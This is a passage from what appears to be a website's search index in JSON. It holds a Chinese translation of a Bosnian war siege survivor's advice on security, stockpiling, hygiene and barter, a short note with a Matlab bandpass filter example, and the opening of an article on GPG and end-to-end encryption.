Selco\u8ba4\u4e3a\uff0c\u653f\u5e9c\u548c\u5b98\u65b9\u90fd\u4e0d\u53ef\u4fe1\uff0c\u5c40\u9762\u6076\u5316\u65f6\uff0c\u4ed6\u4eec\u7edd\u4e0d\u4f1a\u5168\u529b\u53bb\u963b\u6b62\u5f62\u52bf\u8d70\u5411\u65e0\u53ef\u633d\u56de\uff1b\u4ed6\u4eec\u53ea\u4f1a\u52a8\u7528\u4e00\u5207\u516c\u5171\u8d44\u6e90\u6765\u5ffd\u60a0\u4f60\uff0c\u4ee4\u4f60\u76f8\u4fe1\u4e00\u5207\u90fd\u5f88\u597d\u3002 \u8fd9\u573a\u6218\u4e89\u8ddf\u5b97\u6559\uff0c\u6c11\u65cf\uff0c\u4fe1\u4ef0\u6ca1\u6709\u5173\u7cfb\uff0c\u90a3\u90fd\u662f\u653f\u5ba2\u7684\u5e4c\u5b50\u3002\u5bf9\u4e8e\u4e2a\u4eba\u800c\u8a00\uff0c\u6d3b\u4e0b\u53bb\u624d\u662f\u5173\u952e\uff0c\u53ea\u6709\u5bb6\u5ead\uff0c\u5b97\u65cf\uff0c\u4eb2\u5bc6\u7684\u670b\u53cb\u548c\u90bb\u5c45\uff0c\u662f\u6700\u53ef\u4f9d\u8d56\u7684\u529b\u91cf\u3002\u4e00\u4e9b\u7279\u6b8a\u7684\u4e2a\u4eba\u6280\u80fd\u4f1a\u5f88\u6709\u5e2e\u52a9\uff0cSelco\u6709\u62a4\u58eb\u8d44\u8d28\uff0c\u662f\u6025\u6551\u5458\u3002\u836f\u54c1+\u77e5\u8bc6\u5f88\u503c\u94b1\uff08\u4f46\u836f\u54c1\u6709\u4fdd\u8d28\u671f\uff09\u3002 \u6b64\u5916\uff0c\u673a\u68b0\u7535\u5b50\u4fee\u7406\u6280\u80fd\u4e5f\u80fd\u6d3e\u4e0a\u7528\u573a\u3002\u8fd8\u6709\u4eba\u4f1a\u70bc\u6cb9\u505a\u6cb9\u706f\u3002 \u901a\u4fe1\u4e2d\u65ad\uff0c\u8c23\u8a00\u56db\u8d77\u3002\u6bcf\u4e2a\u4eba\u90fd\u8981\u5b66\u4f1a\u6001\u52bf\u7684\u5224\u65ad\u80fd\u529b\u3002\u77e5\u9053\u4ec0\u4e48\u65f6\u5019\u5927\u5bb6\u90fd\u8bf4\u6ca1\u4e8b\u7684\u65f6\u5019\u4f1a\u51fa\u5927\u4e8b\u3002 \uff08\u6027\u522b\uff1a\u5973\uff1b\u4ee3\u53f7\u201c\u7bad\u201d\uff1b\u7279\u957f\uff1a\u5c04\u51fb\u3002\u6ce2\u65af\u5c3c\u4e9a\u5973\u72d9\u51fb\u624b\uff0c\u5965\u6797\u5339\u514b\u5c04\u51fb\u961f\u961f\u5458\uff0c\u5fd7\u613f\u53c2\u52a0\u5e02\u6c11\u6c11\u5175\u7ec4\u7ec7\uff0c\u72d9\u6740\u8fc7\u6570\u5341\u4e2a\u56f4\u57ce\u7684\u585e\u65cf\u72d9\u51fb\u624b\u3002\u2014\u2014\u96be\u4ee5\u7f6e\u4fe1\u7684\u662f\uff0c\u5979\u7684\u6c11\u65cf\u4e5f\u662f\u585e\u65cf\u3002\u5728\u56f4\u56f0\u4e2d\uff0c\u662f\u4fe1\u4efb\u81ea\u5df1\u5468\u56f4\u7684\u4eb2\u53cb\u90bb\u5c45\uff0c\u8fd8\u662f\u4fe1\u4efb\u6240\u8c13\u7684\u793e\u4f1a\u516c\u4ec6\uff0c\u4eba\u6c11\u4ee3\u8868\u5462\uff1f\uff09 \u6b66\u5668\u548c\u5b89\u9632 \u519b\u961f\u5f00\u8fc7\u6765\u7684\u65f6\u5019\uff0c\u653f\u5ba2\u544a\u8bc9\u5e02\u6c11\uff0c\u4ed6\u4eec\u662f\u5b50\u5f1f\u5175\u3002\u4f46\u4e00\u89c9\u9192\u6765\u4ee5\u540e\uff0c\u5927\u5bb6\u5374\u53d1\u73b0\u57ce\u5e02\u5df2\u7ecf\u88ab\u4ed6\u4eec\u56f4\u56f0\u3002\u6218\u4e89\u7206\u53d1\u4e86\uff0c\u6b66\u88c5\u4eba\u5458\u5728\u62c9\u8fbe\u8f7f\u8f66\u4e0a\u88c5\u673a\u67aa\uff0c\u5f88\u591a\u6c11\u5175\u7a7f\u5f97\u548c\u8001\u767e\u59d3\u4e00\u6837\uff0c\u65e0\u6cd5\u533a\u522b\u6b63\u89c4\u519b\u548c\u76d7\u532a\u3002\u52a0\u6cb9\u7ad9\uff0c\u548c\u5546\u5e97\u5f88\u5feb\u5c31\u88ab\u6b79\u5f92\u62a2\u63a0\u4e00\u7a7a\u3002 \uff08\u66fe\u7ecf\u7cbe\u9510\u7684\u4eba\u6c11\u519b\uff0c\u5815\u843d\u4e3a\u4e71\u519b\u6d41\u5bc7\uff0c\u67aa\u6746\u5b50\u91cc\u51fa\u519b\u9600\uff09 \u56f4\u57ce\u671f\u95f4\uff0c\u4e3a\u4e86\u81ea\u4fdd\uff0c\u4e00\u4e9b\u5c0f\u7684\u5bb6\u5ead\u4f1a\u51d1\u6210\u4e00\u5927\u5bb6\u5b50\uff1b\u5982\u679c\u843d\u5355\uff0c\u5219\u5f88\u53ef\u80fd\u4f1a\u88ab\u76d7\u532a\u52ab\u6740\u3002\u5982\u679c\u6709\u4eba\u6765\u88ad\u51fb\uff0c\u8981\u8ba9\u4ed6\u770b\u5230\u4f60\u5bb6\u6709\u5145\u5206\u7684\u51c6\u5907\u3002\u5bb6\u91cc\u65f6\u523b\u67095\u4e2a\u4eba\u503c\u73ed\uff0c\u67091\u4e2a\u4eba\u5728\u4f4f\u5b85\u5916\u9762\u4f5c\u4e3a\u6697\u54e8\u3002\u628a\u5927\u95e8\uff0c\u7a97\u6237\u7528\u6c99\u888b\u5c01\u8d77\u6765\uff1b\u7528\u68af\u5b50\u4ece\u56f4\u5899\u51fa\u5165\u3002\u7531\u4e8e\u767d\u5929\u654c\u519b\u4f1a\u4ee5\u72d9\u51fb\u624b\u548c\u51b7\u70ae\u5c01\u9501\u8857\u9053\uff0c\u591c\u95f4\u6d3b\u52a8\u76f8\u5bf9\u6bd4\u8f83\u5b89\u5168\u3002\u51fa\u5165\u548c\u901a\u8fc7\u8def\u53e3\u4e00\u5b9a\u8981\u5feb\u901f\u2014\u2014\u5728\u8428\u62c9\u70ed\u7a9d\u56f4\u57ce\u671f\u95f4\uff0c\u5e02\u6c11\u8fc7\u9a6c\u8def\u90fd\u662f\u8d70Z\u5b57\u8def\u7ebf\uff0c\u8bd1\u6ce8\u3002 (\u56f4\u57ce\u7684\"\u751f\u5b58\u5730\u56fe\", \u7ea2\u8272\u8868\u793a\u72d9\u51fb\u624b\u6d3b\u52a8\u7684\u533a\u57df) \u6b66\u5668\u65b9\u9762\uff0c\u56f4\u57ce\u671f\u95f4\u4f5c\u8005\u4e00\u5bb6\u56e4\u79ef\u4e86\u4e0d\u5c11\u6b66\u5668\uff083\u652fAK,5\u652f\u624b\u67aa\uff09\u3002\u6709\u4e00\u4e9b\u662f\u901a\u8fc7\u9ed1\u5e02\u83b7\u5f97\u7684\u3002\u4f5c\u8005\u73b0\u5728\u548c\u5e73\u65f6\u671f\uff0c\u6709\u6761\u4ef6\u9009\u62e9\u7684\u60c5\u51b5\u4e0b\uff0c\u968f\u8eab\u5e26\u7684\u662fGlock45\uff0c\u4f46.45ACP\u5f39\u836f\u6bd4\u8f83\u7279\u6b8a\uff0c\u6240\u4ee5\u8fd8\u6709\u4e24\u652f\u4fc4\u56fd\u9020\u7684TT\u624b\u67aa\uff0c\u8fd9\u67aa\u7684\u5b50\u5f39\u5728\u5f53\u5730\u4fbf\u5b9c\u4e14\u5bb9\u6613\u627e\u3002\u53e6\u5916\u4f5c\u8005\u5bb6\u91cc\u4e5f\u50a8\u5907\u4e86AK\u81ea\u52a8\u67aa\uff0c\u5176\u5b50\u5f39\u4f9b\u5e94\u4e5f\u6bd4\u8f83\u5e38\u89c1\u3002(AK\u548cTT\u90fd\u4e0d\u662f\u6027\u80fd\u5f88\u597d\u7684\u88c5\u5907\uff0c\u5728\u8fd9\u91cc\u7684\u610f\u4e49\u4e3b\u8981\u5728\u4e8e\u5a01\u6151\u800c\u4e0d\u662f\u6218\u6597\uff09\u3002\u6700\u597d\u67094\u79cd\u4e0d\u540c\u7684\u6b66\u5668\uff0c2000\u53d1\u6216\u8005\u66f4\u591a\u7684\u5f39\u836f\uff08\u5f53\u5730\u6cd5\u5f8b\u5141\u8bb8\uff09\u3002\u90a3\u4e9b\u9632\u8303\u4e25\u5bc6\uff0c\u6709\u9632\u76d7\u7a97\uff0c\u884c\u4e8b\u9ad8\u8c03\u7684\u4f4f\u5bb6\uff0c\u5f80\u5f80\u6700\u5148\u906d\u76d7\u532a\u3002\u6240\u4ee5\u4fdd\u6301\u4f4e\u8c03\u5176\u5b9e\u6bd4\u5916\u5728\u7684\u8bbe\u65bd\u548c\u6b66\u5668\u88c5\u5907\u66f4\u91cd\u8981\u3002\u7edd\u4e0d\u8981\u8ba9\u532a\u5f92\u76ef\u4e0a\u4f60\u5bb6\u3002 \u536b\u751f\u4e0e\u533b\u7597 Selco\u8ba4\u4e3a\u536b\u751f\u975e\u5e38\u91cd\u8981\uff0c\u751a\u81f3\u8d85\u8fc7\u98df\u7269\uff0c\u8fd9\u53ef\u80fd\u4e0e\u4ed6\u62a4\u58eb\u7684\u804c\u4e1a\u6709\u5173\uff0c\u4f46\u8fd9\u79cd\u89c2\u70b9\u53cd\u5e94\u4e86\u6218\u4e89\u7684\u4e8b\u5b9e\uff0c\u6bd4\u5982\u7b2c\u4e00\u6b21\u6d77\u6e7e\u6218\u4e89\u4e2d\u5f88\u591a\u513f\u7ae5\u7684\u6b7b\u4ea1\u5e76\u975e\u6765\u81ea\u76f4\u63a5\u7684\u6b66\u5668\u6740\u4f24\uff0c\u800c\u662f\u7f3a\u533b\u5c11\u836f\u9020\u6210\u3002 \u8981\u8ba4\u771f\u5b66\u4e60\u6025\u6551\uff0c\u5b66\u4f1a\u5904\u7406\u5916\u4f24\uff0c\u70e7\u4f24\uff0c\u67aa\u51fb\u7b49\uff0c\u5b66\u4f1a\u6ce8\u5c04\u7b49\u6280\u80fd\u3002\u6ca1\u6709\u533b\u9662\uff0c\u6ca1\u6709\u533b\u751f\uff0c\u5373\u4f7f\u6709\u533b\u751f\u4eba\u5bb6\u4e5f\u6ca1\u6cd5\u7ed9\u4f60\u5f00\u836f\u6cbb\u7597\uff0c\u56e0\u4e3a\u836f\u54c1\u548c\u533b\u7597\u5668\u68b0\u90fd\u4e0d\u5177\u5907\u3002 \u7531\u4e8e\u996e\u6c34\u4e0d\u6d01\uff0c\u75e2\u75be\u8179\u6cfb\u53ef\u4ee5\u8f7b\u6613\u5f04\u6b7b\u4eba\uff0c\u9664\u975e\u80fd\u53ca\u65f6\u6cbb\u7597\uff0c\u70b9\u6ef4\u8865\u6c34\u3002\u75e2\u75be\u5bf9\u5c0f\u5b69\u548c\u8001\u5e74\u4eba\u5f88\u5371\u9669\u3002 \u5728\u5916\u4f24\u65b9\u9762\uff0c\u6700\u5e38\u89c1\u7684\u662f\u67aa\u4f24\u3002\u5982\u679c\u80fd\u627e\u5230\u533b\u751f\uff0c\u53ef\u80fd\u6709\u4e09\u6210\u5de6\u53f3\u751f\u8fd8\u7684\u5e0c\u671b\u3002\u4e00\u70b9\u5c0f\u7684\u5272\u4f24\u7684\u611f\u67d3\u5c31\u80fd\u81f4\u547d\u3002 \u5728\u836f\u54c1\u65b9\u9762\uff0c\u6297\u751f\u7d20\u5f88\u7ba1\u7528\u3002Selco\u8fd8\u63a8\u8350\u996e\u6c34\u6d88\u6bd2\u7247\uff0c\u5404\u79cd\u6e05\u6d01\u5de5\u5177\uff0c\u6d17\u6db2\uff0c\u80a5\u7682\uff0c\u6f02\u767d\u5242\uff0c\u6740\u866b\u5242\uff0c\u624b\u5957\uff0c\u53e3\u7f69\u7b49\u5404\u79cd\u536b\u751f\u7528\u54c1\u3002 \u9ec4\u91d1\u767d\u94f6\u4e0e\u6613\u8d27 \u94f6\u884c\u762b\u75ea\u4e86\uff0c\u5404\u79cd\u5361\u5168\u6ca1\u7528\u3002\u6613\u8d27\u4ea4\u6613\u6210\u4e3a\u4e86\u5e02\u573a\u7684\u5f62\u6001\u3002\u4f46\u8981\u6ce8\u610f\uff0c\u4e0d\u5728\u81ea\u5df1\u5bb6\u5468\u56f4\u4ea4\u6613\uff0c\u6bcf\u6b21\u53ea\u5e26\u4e00\u70b9\u70b9\u7269\u54c1\uff0c\u514d\u5f97\u62db\u60f9\u62a2\u63a0\u3002 \u6218\u4e89\u5f00\u59cb\u65f6\uff0c\u57ce\u91cc\u7684\u9152\u5382\u88ab\u70b8\uff0c\u4f5c\u8005\u4ece\u90a3\u91cc\u641e\u6765\u4e86500\u5347\u7684\u5a01\u58eb\u5fcc\u3002\u9152\u7cbe\u53ef\u4ee5\u7528\u6765\u6d88\u6bd2\uff0c\u662f\u5f88\u597d\u7684\u7269\u8d44\uff0c\u6218\u65f6\u6d88\u8017\u975e\u5e38\u5feb\uff0c\u4f5c\u8005\u7528\u5b83\u6765\u4ea4\u6613\u66f4\u9700\u8981\u7684\u7269\u8d44\u3002 \u9ec4\u91d1\uff1f\u4f5c\u8005\u7684\u9ec4\u91d1\u5168\u90e8\u6362\u6210\u4e86\u5b50\u5f39\u3002\u5496\u5561\uff0c\u9999\u70df\u975e\u5e38\u503c\u94b1\u3002\u5395\u7eb8\uff0c\u6781\u5176\u7f3a\u4e4f\uff0c\u5e38\u5e38\u62ff\u6765\u4ea4\u6613\u3002\u8721\u70db\uff0c\u7535\u6c60\u4e5f\u53ef\u4ee5\u50a8\u5907\u4e00\u4e9b\uff0c\u62ff\u6765\u4ea4\u6613\u6362\u98df\u54c1\u3002\u6253\u706b\u673a\uff1a\u5982\u679c\u80fd\u5b581000\u4e2a\u6253\u706b\u673a\uff0c\u8fd9\u4e1c\u897f\u4e0d\u5360\u5730\u65b9\uff0c\u5374\u53ef\u4ee5\u6362\u5f88\u591a\u7269\u54c1\u3002\u76d0\uff0c\u6bd4\u8f83\u91cd\u8981\uff0c\u4f46\u91cf\u4e0d\u5927\uff0c\u6ca1\u6709\u5496\u5561\u8d35\u91cd\u3002\u5ba0\u7269\uff0c\u51e0\u4e4e\u770b\u4e0d\u5230\u3002\u4e5f\u8bb8\u6709\u4eba\u5403\u4e86\u5b83\u4eec\u3002 \u4f5c\u8005\u7236\u4eb2\u7684\u5927\u623f\u5b50\uff0c\u6218\u4e89\u7206\u53d1\u65f6\u9003\u79bb\uff0c\u53ef\u80fd\u662f\u6218\u4e89\u671f\u95f4\u88ab\u96be\u6c11\u8fc1\u5165\uff0c\u6218\u540e\u4e3a\u4e86\u7d22\u56de\uff0c\u6253\u4e86\u56db\u5e74\u5b98\u53f8\uff0c\u4ec5\u4ec5\u662f\u56e0\u4e3a\u4ed6\u7236\u4eb2\u9003\u8d70\u7684\u65f6\u5019\u6ca1\u6709\u5e26\u623f\u5951\u3002\u2014\u2014\u8fd9\u662f\u535a\u4e3b\u53cd\u590d\u5f3a\u8c03\u5728\u758f\u6563\u5305\u91cc\u5907\u8d44\u4ea7\u76f8\u5173\u6587\u4ef6\u7684\u539f\u56e0\uff0c\u8bd1\u6ce8\u3002 \u98df\u54c1\u548c\u71c3\u6599 \u6218\u524d\uff0c\u4ed6\u4eec\u7528\u7535\u5668\u505a\u996d\u3002\u6218\u65f6\uff0cSelco\u4e70\u4e86\u67f4\u706b\u7089\uff0c\u5728\u5c4b\u9876\u67b6\u70df\u7b52\uff0c\u505a\u996d\uff0c\u53d6\u6696\u3002\u590f\u5929\u4ed6\u4eec\u5728\u540e\u9662\u505a\u996d\u3002 \u5927\u7c73\u662f\u6bd4\u8f83\u5bb9\u6613\u70f9\u5236\u7684\u98df\u7269\uff0c\u7701\u71c3\u6599\u3002 \u6709\u4eba\u62c5\u5fc3\u505a\u996d\u7684\u6c14\u5473\u4f1a\u62db\u6765\u654c\u4eba\uff0c\u5b9e\u9645\u662f\u591a\u8651\u4e86\uff0c\u5728\u6c61\u6c34\u904d\u5730\u3001\u81ed\u6c14\u718f\u5929\u7684\u5e9f\u589f\u91cc\uff0c\u505a\u996d\u7684\u6c14\u5473\u5e76\u4e0d\u660e\u663e\u3002 \u50a8\u5907\u7684\u6559\u8bad \u5982\u679c\u8981\u50a8\u5907\uff0c\u5e94\u8be5\u50a8\u5907\u4ec0\u4e48\uff1f\u65e0\u7591\uff0c\u5728\u548c\u5e73\u65f6\u671f\uff0c\u5fc5\u987b\u8981\u4ed4\u7ec6\u50a8\u5907\u3002\u5f88\u591a\u4eba\u9996\u5148\u60f3\u5230\u7684\u662f\u6b66\u5668\uff0c\u5200\u5177\uff0c\u4f46\u5982\u679c\u6ca1\u6709\u98df\u7269\uff0c\u5728\u90a3\u79cd\u60c5\u51b5\u4e0b\u4f60\u5c31\u5815\u843d\u6210\u76d7\u532a\u3002 \u5982\u679c\u7ed9\u4e09\u4e2a\u6708\u7684\u65f6\u95f4\u51c6\u5907\uff0c\u4f5c\u8005\u5efa\u8bae\u50a8\u5907\u516d\u4e2a\u6708\u7684\u98df\u54c1\uff0c\u836f\u54c1\uff0c\u71c3\u6599\u7b49\u3002\u5728\u4e61\u4e0b\u5982\u679c\u6709\u4eb2\u621a\u548c\u623f\u5b50\uff0c\u8981\u91cc\u518d\u50a8\u59076\u4e2a\u6708\u7684\u7269\u8d44\u3002\u623f\u5c4b\u6700\u597d\u8981\u6709\u5927\u7684\u82b1\u56ed\u53ef\u4ee5\u79cd\u690d\u3002 \u4f5c\u8005\u8003\u8651\u7684\u6e05\u5355\u5f88\u8be6\u7ec6\u800c\u5177\u4f53\uff0c\u6709\u6b66\u5668\uff0c\u5f39\u836f\uff0c\u6c34\uff0c\u98df\u7269\uff0c\u836f\u54c1\uff0c\u71c3\u6599\uff08\u7535\u6c60\uff09\u7b49\u3002\u6b66\u5668\uff1a4\u79cd\u4e0d\u540c\u7684\u6b66\u5668\uff0c2000\u53d1\u6216\u8005\u66f4\u591a\u7684\u5f39\u836f\uff08\u5f53\u5730\u6cd5\u5f8b\u5141\u8bb8\uff09\u3002\u6c34\uff1a\u5728\u5c4b\u9876\u5b58\u4e86\u56db\u5927\u6876\u3002\u6cb3\u6c34\u6709\u6c61\u67d3\uff0c\u4f46\u4e0d\u5f97\u4ee5\u7684\u60c5\u51b5\u4e0b\uff0c\u4e5f\u53ea\u597d\u559d\u6cb3\u6c34\u3002\u98df\u7269\u4f5c\u8005\u5e76\u6ca1\u6709\u7279\u6b8a\u5f3a\u8c03\uff0c\u4f46\u63d0\u5230\u4e86\u5927\u7c73\u2014\u2014\u4e00\u822c\u7684\u539f\u5219\u662f\u50a8\u5907\u7c73\u9762\u8c46\u7c7b\u7cd6\u7c7b\u5976\u7c89\u7b49\u5e38\u89c4\u7684\u98df\u54c1\uff0c\u4e0d\u5efa\u8bae\u50a8\u5907\u8fc7\u4e8e\u6602\u8d35\u3001\u5c11\u89c1\u3001\u65b0\u5947\u7684\u98df\u7269\u7c7b\u578b\u3002 \u524d\u9762\u63d0\u5230\u7684\u5404\u7c7b\u536b\u751f\u6d88\u6bd2\u7528\u54c1\u3002\u6b64\u5916\uff0c\u8fd8\u9700\u8981\u50a8\u5907\u4e00\u4e9b\u5c0f\u4e1c\u897f\uff0c\u53ef\u4ee5\u62ff\u6765\u6613\u8d27\u8d38\u6613\uff0c\u5982\u745e\u58eb\u5c0f\u5200\uff0c\u6253\u706b\u673a\u548c\u706b\u77f3\u7b49\u3002\u6c14\u4f53\u6253\u706b\u673a\u4e0d\u5360\u5730\u65b9\uff0c\u5b9e\u9645\u5374\u5f88\u6709\u7528\uff0c\u53ef\u4ee5\u591a\u50a8\u5907\u51e0\u767e\u4e2a\u3002\u9999\u70df\uff0c\u5496\u5561\uff0c\u9152\u7cbe\uff08\u767d\u9152\uff09\u4e5f\u4e0d\u9519\uff0c\u52a3\u8d28\u7684\u767d\u9152\u5728\u5f53\u65f6\u4ecd\u7136\u53d7\u6b22\u8fce\u3002\u4f5c\u8005\u8fd8\u5907\u4e86\u4e00\u4e9b\u6c14\u7f50\uff0c\u7528\u6765\u704c\u6253\u706b\u673a\u6c14\u3002\u8721\u70db\u4e5f\u7528\u6765\u6613\u8d27\u8d38\u6613\u3002 \u8bd1\u8005\u4e2a\u4eba\u603b\u7ed3\uff1a Selco\u5bf9\u5b89\u5168\uff0c\u533b\u7597\uff0c\u50a8\u5907\uff0c\u8d38\u6613\u7684\u63cf\u8ff0\u975e\u5e38\u8be6\u5c3d\uff0c\u662f\u8bbf\u8c08\u6700\u6709\u4ef7\u503c\u7684\u90e8\u5206\uff0c\u5e94\u8be5\u591a\u770b\u3002 \u6ce2\u9ed1\u5185\u6218\u5c5e\u4e8e\u6781\u7aef\u4e25\u9177\u7684\u60c5\u51b5\u3002\u4e2a\u4eba\u8ba4\u4e3a\u56fd\u7834\u5c71\u6cb3\u5728\u90a3\u79cd\u6761\u4ef6\u4e0b\uff0c\u5c3d\u5feb\u5c3d\u4e00\u5207\u624b\u6bb5\u758f\u6563\u4ed6\u4e61\u624d\u662f\u552f\u4e00\u7684\u9009\u62e9\uff0c\u800c\u575a\u5b88\u5219\u5c5e\u4e8e\u6700\u7cdf\u7cd5\u7684\u65b9\u6848\u3002Selco\u4e00\u5bb6\u9009\u62e9\u575a\u5b88\uff0c\u4e3a\u6b64\u4ed8\u51fa2\u4f4d\u5bb6\u4eba\u548c1\u5e74\u975e\u4eba\u751f\u6d3b\u7684\u4ee3\u4ef7\uff0c\u8428\u62c9\u70ed\u7a9d\u7684\u5c45\u6c11\u5219\u5728\u70ae\u53e3\u4e0b\u751f\u6d3b\u4e861500\u591a\u5929\u3002 \u7f8e\u56fd\u786e\u5b9e\u505a\u5bf9\u4e86\u5f88\u591a\u4e8b\u60c5\u3002 \u6765\u6e90\uff1a http://www.tacticalintelligence.net/blog/shtf-survival-qa-a-first-hand-account.htm \u7f16\u8bd1\uff1a\u94f6\u6cb3 \u539f\u6587\u94fe\u63a5\uff1a http://www.mychinese.news/2017/01/a-first-hand-account-of-long-term-shtf.html?m=1","title":"\u6ce2\u9ed1\u56f4\u57ce\u6218\u4e2d\u7684\u5e78\u5b58\u8005"},{"location":"other/%E6%BB%A4%E6%B3%A2%E5%99%A8/","text":"\u6ee4\u6ce2\u5668 1.\u6ee4\u6ce2\u5668\u7684\u6982\u5ff5 \u4e3a\u4e86\u9610\u8ff0\u6ee4\u6ce2\u5668\u7684\u6982\u5ff5\uff0c\u6211\u4eec\u9996\u5148\u6765\u770b\u4e24\u4e2a\u573a\u666f\u3002 \u5728\u8fd9\u4e24\u4e2a\u573a\u666f\u4e2d\uff0c\u4e3a\u4e86\u6392\u9664\u4e0d\u540c\u9891\u6bb5\u4fe1\u53f7\uff08\u58f0\u97f3\uff09\u7684\u5e72\u6270\uff0c\u6211\u4eec\u9700\u8981\u4f7f\u7528\u4e00\u79cd\u5de5\u5177\u5c06\u4e0d\u9700\u8981\u7684\u9891\u6bb5\u6ee4\u9664\u51fa\u53bb\uff0c\u8fd9\u79cd\u5de5\u5177\u5c31\u662f\u6ee4\u6ce2\u5668\u3002 2.\u9ad8\u901a\u3001\u4f4e\u901a\u548c\u5e26\u901a \u5047\u5b9a\u6211\u4eec\u6709\u4e09\u4e2a\u4e0d\u540c\u9891\u7387\u7684\u6b63\u5f26\u4fe1\u53f7\uff0c\u5f53\u4ed6\u4eec\u76f8\u4e92\u53e0\u52a0\u4e4b\u540e\uff0c\u5982\u4f55\u5c06\u6211\u4eec\u60f3\u8981\u7684\u4fe1\u53f7\u5206\u79bb\u51fa\u6765\u5462\uff1f \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u9ad8\u901a\uff0c\u4f4e\u901a\u548c\u5e26\u901a\u6ee4\u6ce2\u5668\u5206\u522b\u5f97\u5230\u6211\u4eec\u60f3\u8981\u7684\u90e8\u5206\u3002 3.\u4f7f\u7528 Matlab \u751f\u6210\u6ee4\u6ce2\u5668 hd = design(fdesign.bandpass('N,F3dB1,F3dB2',6,7500,8500,fs),'butter');res = filter(hd,data); \u5176\u4e2d\uff0cdata \u662f\u8f93\u5165\u88ab\u6ee4\u6ce2\u7684\u4fe1\u53f7\uff0cres \u662f\u8f93\u51fa\u7684\u7ed3\u679c\u3002\u5982\u679c\u5bf9 matlab \u4e2d\u6ee4\u6ce2\u5668\u611f\u5174\u8da3\uff0c\u53ef\u4ee5\u8f93\u5165 > help fdesign.bandpass \u4e0b\u9762\u6211\u4eec\u7528 matlab \u751f\u6210\u7684\u6ee4\u6ce2\u5668\u8fdb\u884c\u6ee4\u6ce2\u3002 \u6ee4\u6ce2\u7684\u7ed3\u679c\u5982\u4e0b\uff1a \u539f\u6587\u94fe\u63a5\uff1a https://jacksmiththu.github.io/2018/01/02/\u6ee4\u6ce2\u5668/","title":"\u6ee4\u6ce2\u5668"},{"location":"other/%E6%BB%A4%E6%B3%A2%E5%99%A8/#_1","text":"","title":"\u6ee4\u6ce2\u5668"},{"location":"other/%E6%BB%A4%E6%B3%A2%E5%99%A8/#1","text":"\u4e3a\u4e86\u9610\u8ff0\u6ee4\u6ce2\u5668\u7684\u6982\u5ff5\uff0c\u6211\u4eec\u9996\u5148\u6765\u770b\u4e24\u4e2a\u573a\u666f\u3002 \u5728\u8fd9\u4e24\u4e2a\u573a\u666f\u4e2d\uff0c\u4e3a\u4e86\u6392\u9664\u4e0d\u540c\u9891\u6bb5\u4fe1\u53f7\uff08\u58f0\u97f3\uff09\u7684\u5e72\u6270\uff0c\u6211\u4eec\u9700\u8981\u4f7f\u7528\u4e00\u79cd\u5de5\u5177\u5c06\u4e0d\u9700\u8981\u7684\u9891\u6bb5\u6ee4\u9664\u51fa\u53bb\uff0c\u8fd9\u79cd\u5de5\u5177\u5c31\u662f\u6ee4\u6ce2\u5668\u3002","title":"1.\u6ee4\u6ce2\u5668\u7684\u6982\u5ff5"},{"location":"other/%E6%BB%A4%E6%B3%A2%E5%99%A8/#2","text":"\u5047\u5b9a\u6211\u4eec\u6709\u4e09\u4e2a\u4e0d\u540c\u9891\u7387\u7684\u6b63\u5f26\u4fe1\u53f7\uff0c\u5f53\u4ed6\u4eec\u76f8\u4e92\u53e0\u52a0\u4e4b\u540e\uff0c\u5982\u4f55\u5c06\u6211\u4eec\u60f3\u8981\u7684\u4fe1\u53f7\u5206\u79bb\u51fa\u6765\u5462\uff1f \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u9ad8\u901a\uff0c\u4f4e\u901a\u548c\u5e26\u901a\u6ee4\u6ce2\u5668\u5206\u522b\u5f97\u5230\u6211\u4eec\u60f3\u8981\u7684\u90e8\u5206\u3002","title":"2.\u9ad8\u901a\u3001\u4f4e\u901a\u548c\u5e26\u901a"},{"location":"other/%E6%BB%A4%E6%B3%A2%E5%99%A8/#3-matlab","text":"hd = design(fdesign.bandpass('N,F3dB1,F3dB2',6,7500,8500,fs),'butter');res = filter(hd,data); \u5176\u4e2d\uff0cdata \u662f\u8f93\u5165\u88ab\u6ee4\u6ce2\u7684\u4fe1\u53f7\uff0cres \u662f\u8f93\u51fa\u7684\u7ed3\u679c\u3002\u5982\u679c\u5bf9 matlab \u4e2d\u6ee4\u6ce2\u5668\u611f\u5174\u8da3\uff0c\u53ef\u4ee5\u8f93\u5165 > help fdesign.bandpass \u4e0b\u9762\u6211\u4eec\u7528 matlab \u751f\u6210\u7684\u6ee4\u6ce2\u5668\u8fdb\u884c\u6ee4\u6ce2\u3002 \u6ee4\u6ce2\u7684\u7ed3\u679c\u5982\u4e0b\uff1a \u539f\u6587\u94fe\u63a5\uff1a https://jacksmiththu.github.io/2018/01/02/\u6ee4\u6ce2\u5668/","title":"3.\u4f7f\u7528 Matlab \u751f\u6210\u6ee4\u6ce2\u5668"},{"location":"other/%E7%8E%8B%E5%AD%90%E4%BA%AD%E7%9A%84%E5%8D%9A%E5%AE%A2%20GPG%20%E4%B8%8E%E7%AB%AF%E5%88%B0%E7%AB%AF%E5%8A%A0%E5%AF%86%EF%BC%9A%E8%AE%BA%E4%BB%80%E4%B9%88%E6%89%8D%E6%98%AF%E5%8F%AF%E4%BB%A5%E4%BF%A1%E4%BB%BB%E7%9A%84/","text":"GPG \u4e0e\u7aef\u5230\u7aef\u52a0\u5bc6\uff1a\u8bba\u4ec0\u4e48\u624d\u662f\u53ef\u4ee5\u4fe1\u4efb\u7684 \u67e5\u770b\u6e90\u4ee3\u7801 2017 9 \u6708 12 \u65e5* \u4fe1\u606f\u5b89\u5168 * \u5bc6\u7801\u5b66 \u672c\u6587\u7531\u6211\u53bb\u5e74 6 \u6708\u5728 LeanCloud \u7684\u4e00\u6b21\u6280\u672f\u5206\u4eab\u6574\u7406\u800c\u6765\uff0c\u9700\u8981\u8bfb\u8005\u5bf9\u516c\u94a5\u52a0\u5bc6\u7b97\u6cd5\u6709\u57fa\u672c\u7684\u4e86\u89e3\u3002 \u5982\u679c\u63d0\u5230 GPG \u90a3\u4e48\u4e0d\u5f97\u4e0d\u63d0\u7684\u5c31\u662f\u516c\u94a5\u52a0\u5bc6\u7b97\u6cd5\uff0c\u9996\u5148\u6211\u4eec\u5148\u6765\u5feb\u901f\u5730\u4e86\u89e3\u4e00\u4e0b\u6700\u77e5\u540d\u7684\u516c\u94a5\u52a0\u5bc6\u7b97\u6cd5 \u2014\u2014 RSA\uff1a\u5728 RSA 